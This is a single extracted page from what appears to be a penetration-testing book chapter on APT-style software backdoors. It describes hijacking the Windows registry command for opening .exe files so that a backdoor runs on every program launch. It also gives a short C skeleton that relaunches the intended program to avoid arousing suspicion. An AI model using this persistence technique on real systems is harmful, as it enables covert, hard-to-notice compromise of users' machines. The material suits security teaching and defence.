<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf1b0" class="pf w2 h2" data-page-no="1b0"><div class="pc pc1b0 w2 h2"><div class="t m0 x6 h10 y83 ff2 fs2 fc0 sc0 ls8 ws0">Chapter 10: APT Software Backdoors<span class="_ _9"> </span><span class="ff1 fs9 lsa">409</span></div><div class="t m0 x3 h7 y328 ff1 fs3 fc0 sc0 ls0 ws0">Autostart: One Exe to Rule Them All</div><div class="t m0 x3 hd y329 ff4 fs7 fc0 sc0 ls0 ws0">Another interesting way to ha<span class="_ _0"/>ve our backdoor automatically start is by changing </div><div class="t m0 x3 hd y32a ff4 fs7 fc0 sc0 ls0 ws0">the registry k<span class="_ _0"/>ey that controls what happens when an e<span class="_ _0"/>xecutable is run. <span class="_ _0"/>The default </div><div class="t m0 x3 hd y32b ff4 fs7 fc0 sc0 ls0 ws0">registry k<span class="_ _0"/>ey v<span class="_ _0"/>alue of the HKEY_CLASSES_R<span class="_ _0"/>OO<span class="_ _2"/>T\exele\shell\open\command </div><div class="t m0 x3 hd y32c ff4 fs7 fc0 sc0 ls0 ws0">ke<span class="_ _0"/>y is</div><div class="t m0 x3 h44 y26da fff fse fc0 sc0 ls0 ws0">"%1" %*</div><div class="t m0 x4 hd y26db ff4 fs7 fc0 sc0 ls0 ws0">Y<span class="_ _1b"/>ou’ll also notice that there are entries in HKEY_CLASSES_R<span class="_ _0"/>OO<span class="_ _0"/>T for e<span class="_ _0"/>very </div><div class="t m0 x3 hd y26dc ff4 fs7 fc0 sc0 ls0 ws0">le type, which you can change to af<span class="_ _0"/>fect what happens when a le of that type is </div><div class="t m0 x3 hd y26dd ff4 fs7 fc0 sc0 ls0 ws0">opened. This basically tells Explorer to launch the e<span class="_ _0"/>xecutable that has been specied, </div><div class="t m0 x3 hd y26de ff4 fs7 fc0 sc0 ls0 ws0">either by double-clicking or right-clicking and choosing Open. <span class="_ _0"/>W<span class="_ _3"/>e can change this </div><div class="t m0 x3 hd y26df ff4 fs7 fc0 sc0 ls0 ws0">ke<span class="_ _0"/>y to point to our backdoor ex<span class="_ _0"/>ecutable, which will then run ev<span class="_ _0"/>ery time a le with an </div><div class="t m0 x3 hd y26e0 ff4 fs7 fc0 sc0 ls0 ws0">.ex<span class="_ _0"/>e extension is opened, as in the follo<span class="_ _0"/>wing e<span class="_ _0"/>xample:</div><div class="t m0 x3 h44 y26e1 fff fse fc0 sc0 ls0 ws0">c:\innocent\backdoor.exe "%1" %*</div><div class="t m0 x4 hd y26e2 ff4 fs7 fc0 sc0 ls0 ws0">If we change the ke<span class="_ _0"/>y in this way<span class="_ _2"/>, then we’ll ha<span class="_ _0"/>ve to start the intended e<span class="_ _0"/>xecutable </div><div class="t m0 x3 hd y26e3 ff4 fs7 fc0 sc0 ls0 ws0">programmatically from within our backdoor<span class="_ _2"/>. If we don’t, then only the backdoor will </div><div class="t m0 x3 hd y26e4 ff4 fs7 fc0 sc0 ls0 ws0">be ex<span class="_ _0"/>ecuted and the intended program will not open, which will obviously inspire </div><div class="t m0 x3 hd y26e5 ff4 fs7 fc0 sc0 lsb ws16">someone to in<span class="_ _0"/>v<span class="_ _0"/>estigate the cause. T<span class="_ _3"/>o execute the intended e<span class="_ _0"/>xecutable from within our </div><div class="t m0 x3 hd y26e6 ff4 fs7 fc0 sc0 ls0 ws0">backdoor<span class="_ _0"/>, we can use the follo<span class="_ _0"/>wing as a skeleton to w<span class="_ _0"/>ork from:</div><div class="t m0 x3 h40 y26e7 fff fs5 fc0 sc0 ls0 ws0">#include &lt;stdio.h&gt;</div><div class="t m0 x3 h40 y26e8 fff fs5 fc0 sc0 ls0 ws0">#include &lt;stdlib.h&gt;</div><div class="t m0 x3 h40 y26e9 fff fs5 fc0 sc0 ls0 ws0">#include &lt;windows.h&gt;</div><div class="t m0 x3 h40 y26ea fff fs5 fc0 sc0 ls0 ws0">#define WIN32_LEAN_AND_MEAN</div><div class="t m0 x3 h40 y26eb fff fs5 fc0 sc0 ls0 ws0">int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,</div><div class="t m0 x3 h40 y26ec fff fs5 fc0 sc0 ls0 ws0">LPSTR lpCmdLine, int nCmdShow )</div><div class="t m0 x3 h40 y26ed fff fs5 fc0 sc0 ls0 ws0">{</div><div class="t m0 x3 h40 y26ee fff fs5 fc0 sc0 ls0 ws0">STARTUPINFO si;</div><div class="t m0 x3 h40 y26ef fff fs5 fc0 sc0 ls0 ws0">PROCESS_INFORMATION pi;</div><div class="t m0 x3 h40 y26f0 fff fs5 fc0 sc0 ls0 ws0">ZeroMemory( &amp;si, sizeof(si) );</div><div class="t m0 x3 h40 y26f1 fff fs5 fc0 sc0 ls0 ws0">si.cb = sizeof(si);</div><div class="t m0 x3 h40 y26f2 fff fs5 fc0 sc0 ls0 ws0">ZeroMemory( &amp;pi, sizeof(pi) );</div><div class="t m0 x3 h40 y26f3 fff fs5 fc0 sc0 ls0 ws0">CreateProcess( NULL, lpCmdLine, NULL, NULL, 0, 0, NULL, NULL, &amp;si, &amp;pi);</div><div class="t m0 x3 h40 y26f4 fff fs5 fc0 sc0 ls0 ws0">// Perform Malicious Functions</div><div class="t m0 x3 h40 y26f5 fff fs5 fc0 sc0 ls0 ws0">}</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>